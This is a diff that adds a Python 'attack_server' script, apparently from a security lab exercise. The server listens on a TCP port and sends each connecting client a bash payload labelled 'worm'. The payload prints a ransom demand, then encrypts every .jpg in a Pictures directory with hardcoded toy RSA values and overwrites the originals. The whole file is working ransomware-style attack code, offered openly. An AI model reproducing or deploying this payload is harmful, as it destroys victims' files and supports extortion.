@@ -1,0 +1,60 @@
+#!/usr/bin/env python3
+import socket
+import sys
+
+if len(sys.argv) < 2:
+    print('Usage: ./attack_server <attacker_port>')
+    sys.exit(1)
+
+host_ip   = '0.0.0.0'
+host_port = int(sys.argv[1])
+
+fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+fd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+fd.bind((host_ip, host_port))
+fd.listen(3)
+
+print('Server running on ' + host_ip + ':' + str(host_port))
+
+worm = '''
+#!/usr/bin/env bash
+
+echo "////////////////////////////////////////////////////////////////"
+echo "////////////////////       ERROR!!!!!       ////////////////////"
+echo "////////////////      Give me ransom haha!      ////////////////"
+echo "////////////////////////////////////////////////////////////////"
+
+python3 - <<EOF
+import os
+import glob
+import pickle
+
+e = 65535
+n = 22291846172619859445381409012451
+d = 14499309299673345844676003563183
+
+jpgfiles = os.path.expanduser("~/../../app/Pictures/*.jpg")
+for file in glob.glob(jpgfiles):
+    plain_bytes = b''
+    with open(file, 'rb') as f:
+        plain_bytes = f.read()
+    cipher_int = [pow(i, e, n) for i in plain_bytes]
+    with open(file, 'wb') as f:
+        pickle.dump(cipher_int, f)
+EOF
+'''
+
+while True:
+    client, addr = fd.accept()
+    print('client ' + str(addr) + ' connected')
+
+    while True:
+        indata = client.recv(1024)
+        if len(indata) == 0:
+            print('client ' + str(addr) + ' disconnected')
+            client.close()
+            break
+        print('received: ' + indata.decode())
+        client.send(worm.encode())
+
+fd.close()
